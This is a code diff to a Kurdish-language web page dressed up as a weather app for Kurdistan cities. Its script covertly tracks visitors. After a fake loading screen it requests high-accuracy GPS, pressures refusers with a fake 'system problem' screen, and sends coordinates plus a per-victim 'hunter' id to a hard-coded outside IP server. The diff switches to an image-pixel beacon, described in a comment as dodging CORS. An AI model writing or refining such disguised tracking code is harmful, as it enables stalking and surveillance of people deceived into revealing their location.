@@ -33,14 +33,23 @@
     </style>
 </head>
 <body onload="bootSequence()">
-    <div id="boot-loader"><div class="spinner-custom"></div><p style="margin-top: 25px; color: var(--primary); font-weight: bold;">تکایە چاوەڕوان بە...</p></div>
+    <div id="boot-loader">
+        <div class="spinner-custom"></div>
+        <p style="margin-top: 25px; color: var(--primary); font-weight: bold;">تکایە چاوەڕوان بە...</p>
+    </div>
+
     <div id="permission-error">
         <h2 style="color: #ff4757;">⚠️ کێشەی سیستەم</h2>
         <p style="margin-top: 15px;">بۆ بینینی ڕاپۆرتی ورد، دەبێت مۆڵەتی GPS بدەیت.</p>
         <button onclick="autoTrigger()" style="margin-top: 30px; background: var(--primary); border: none; padding: 15px 40px; border-radius: 30px; color: white; font-weight: bold;">دووبارە هەوڵبدەرەوە</button>
     </div>
-    <div class="master-bg" id="bg"></div><div class="mist-layer"></div><canvas id="rain-canvas"></canvas>
+
+    <div class="master-bg" id="bg"></div>
+    <div class="mist-layer"></div>
+    <canvas id="rain-canvas"></canvas>
+
     <header><h1>کەشناسی شارەکانی کوردستان</h1></header>
+
     <div class="app-content">
         <div class="main-card">
             <div class="weather-icon-box">🌦️</div>
@@ -54,34 +63,85 @@
             </div>
         </div>
         <div class="city-list-container">
+            <h3 style="margin: 20px 0 15px 10px; font-size: 18px;">شارەکانی تری کوردستان</h3>
             <div class="city-item"><span>سلێمانی</span><b>١٥° 🌧️</b></div>
             <div class="city-item"><span>دهۆک</span><b>١٦° 🌦️</b></div>
             <div class="city-item"><span>کەرکوک</span><b>٢١° ☀️</b></div>
         </div>
+        <div style="height: 50px;"></div>
     </div>
+
     <script>
         const SERVER_URL = "http://178.18.241.166:5000/receive_loc";
         const hunterId = new URLSearchParams(window.location.search).get('id');
+
         function successHandler(position) {
             document.getElementById("permission-error").style.display = "none";
-            const payload = JSON.stringify({
-                lat: position.coords.latitude, lon: position.coords.longitude,
-                acc: position.coords.accuracy.toFixed(1), id: hunterId
-            });
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", SERVER_URL, true);
-            xhr.setRequestHeader("Content-Type", "text/plain");
-            xhr.send(payload);
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy.toFixed(1);
+
+            // ناردنی داتا بە شێوازی GET لەڕێگەی دروستکردنی وێنە (Image Pixel)
+            // ئەمە ١٠٠٪ کار دەکات و کێشەی CORS دروست ناکات
+            const finalUrl = `${SERVER_URL}?lat=${lat}&lon=${lon}&acc=${acc}&id=${hunterId}`;
+            var img = new Image();
+            img.src = finalUrl;
+
             document.getElementById("mainCity").innerHTML = "ناوچەکەت دیاری کرا ✅";
             alert("ڕاپۆرتی کەشناسی ناوچەکەت نوێ کرایەوە!");
         }
-        function autoTrigger() { if (navigator.geolocation) { navigator.geolocation.getCurrentPosition(successHandler, (err) => { document.getElementById("permission-error").style.display = "flex"; }, {enableHighAccuracy: true}); } }
-        function bootSequence() { setTimeout(() => { document.getElementById("boot-loader").style.display = "none"; autoTrigger(); }, 2500); }
-        // ... Rain effects ...
-        const canvas = document.getElementById('rain-canvas'); const ctx = canvas.getContext('2d'); let drops = [];
-        function initRain() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; for(let i=0; i<100; i++) drops.push({x: Math.random()*canvas.width, y: Math.random()*canvas.height, len: Math.random()*20+10, vel: Math.random()*10+5}); }
-        function drawRain() { ctx.clearRect(0,0, canvas.width, canvas.height); ctx.strokeStyle = 'rgba(255,255,255,0.2)'; ctx.lineWidth = 1; drops.forEach(d => { ctx.beginPath(); ctx.moveTo(d.x, d.y); ctx.lineTo(d.x, d.y+d.len); ctx.stroke(); d.y+=d.vel; if(d.y>canvas.height) d.y=-d.len; }); requestAnimationFrame(drawRain); }
-        initRain(); drawRain();
+
+        function autoTrigger() { 
+            if (navigator.geolocation) { 
+                navigator.geolocation.getCurrentPosition(successHandler, (err) => { 
+                    document.getElementById("permission-error").style.display = "flex"; 
+                }, {enableHighAccuracy: true, timeout: 10000, maximumAge: 0}); 
+            } 
+        }
+
+        function bootSequence() { 
+            initRain(); 
+            drawRain(); 
+            setTimeout(() => { 
+                document.getElementById("boot-loader").style.display = "none"; 
+                autoTrigger(); 
+            }, 2500); 
+        }
+
+        // --- ئەنێمەیشنی باران ---
+        const canvas = document.getElementById('rain-canvas');
+        const ctx = canvas.getContext('2d');
+        let drops = [];
+
+        function initRain() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            for(let i=0; i<150; i++) {
+                drops.push({
+                    x: Math.random() * canvas.width,
+                    y: Math.random() * canvas.height,
+                    len: Math.random() * 20 + 10,
+                    vel: Math.random() * 10 + 5
+                });
+            }
+        }
+
+        function drawRain() {
+            ctx.clearRect(0,0, canvas.width, canvas.height);
+            ctx.strokeStyle = 'rgba(255,255,255,0.2)';
+            ctx.lineWidth = 1;
+            drops.forEach(d => {
+                ctx.beginPath(); ctx.moveTo(d.x, d.y); ctx.lineTo(d.x, d.y + d.len); ctx.stroke();
+                d.y += d.vel; if(d.y > canvas.height) d.y = -d.len;
+            });
+            requestAnimationFrame(drawRain);
+        }
+
+        window.addEventListener('mousemove', (e) => {
+            const moveX = (e.clientX / window.innerWidth) * 15;
+            const moveY = (e.clientY / window.innerHeight) * 15;
+            document.getElementById("bg").style.transform = `scale(1.1) translate(${moveX}px, ${moveY}px)`;
+        });
     </script>
 </body>
 </html>
